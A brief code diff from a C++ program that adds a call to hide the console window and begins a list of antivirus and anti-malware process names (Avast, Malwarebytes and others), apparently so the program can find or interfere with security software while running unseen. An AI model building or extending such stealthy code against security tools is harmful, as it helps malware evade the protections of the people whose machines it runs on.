@@ -16,6 +16,7 @@ using namespace std;
 
 int main()
 {
+    FreeConsole(); // Hides The Console WIndow
     string processList[] = { "AvastUI.exe", 
                              "SDWinSec.exe", 
                              "mbam.exe", 
